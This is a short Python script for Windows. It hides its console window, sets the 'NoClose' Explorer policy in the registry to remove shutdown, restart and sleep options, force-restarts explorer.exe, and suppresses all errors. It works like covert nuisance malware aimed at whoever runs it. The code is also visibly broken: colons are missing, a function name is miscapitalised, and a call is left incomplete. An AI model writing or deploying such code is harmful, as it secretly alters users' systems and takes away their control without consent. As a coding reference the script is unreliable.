import sys
import win32gui
import win32con
import time

def hide_window()
    # This hides the console window so it runs in the background
    try:
         window = win32gui.GetForeGroundwindow()
         win32gui.ShowWindow
    except Exception:
        pass

def disable_power_options():
    import winreg

    try:
        # We use HKEY_CURRENT_USER to modify settingss for the logged-in user
        # Path: Software\Microsoft\Windows|CurrentVersion\Policies\Explorer
        key_path= r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"

        # Open the registry key, create it if it doesn't exist
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)

        # Set "NoClose" to 1. This removes shut down, restart sleep from the menu
        winreg.SetValueEx(key, "noClose", 0, winreg.REG_DWORD, 1)

        winreg.CloseKey(key)

        import os
        os.system("taskkill /f /im explorer.exe")
        time.sleep(5)
        os.system("start explorer.exe")
    
    except Exception as e:

        pass

if __name__ == "__main__"
    hide_window()


    disable_power_options()          